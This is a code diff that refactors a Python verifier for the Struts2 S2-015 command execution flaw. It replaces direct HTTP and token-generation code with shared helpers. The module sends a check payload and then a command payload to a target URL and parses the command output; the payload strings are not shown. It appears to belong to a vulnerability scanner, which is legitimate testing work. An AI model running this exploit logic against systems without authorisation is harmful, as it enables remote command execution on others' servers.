@@ -7,19 +7,13 @@ description: Struts2 S2-015漏洞可执行任意命令
 
 import re
 import urllib
-import string
-import random
-import requests
-from requests.packages.urllib3.exceptions import InsecureRequestWarning
-requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+from app.lib.utils.common import get_capta
+from app.lib.utils.request import request
 
 class S2_015_BaseVerify:
     def __init__(self, url):
         self.url = url 
-        self.capta='' 
-        words=''.join((string.ascii_letters,string.digits))
-        for i in range(8):
-            self.capta = self.capta + random.choice(words) 
+        self.capta = get_capta() 
         self.headers = {
                    'User-Agent': "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36 115Browser/6.0.3",
                    'Connection': "keep-alive",
@@ -31,9 +25,9 @@ class S2_015_BaseVerify:
         if not self.url.startswith("http") and not self.url.startswith("https"):
             self.url = "http://" + self.url
         try:
-            check_req = requests.get(self.url + self.check_payload, headers = self.headers)
+            check_req = request.get(self.url + self.check_payload, headers = self.headers)
             if self.capta in check_req.text:
-                cmd_req = requests.get(self.url + self.cmd_payload, headers = self.headers)
+                cmd_req = request.get(self.url + self.cmd_payload, headers = self.headers)
                 result = re.findall('''Message</b>(.*?).jsp''', cmd_req.text)
                 cmd_str = re.sub('/', '', result[0] )
                 cmd_str = re.sub('%0A', '\n', cmd_str )
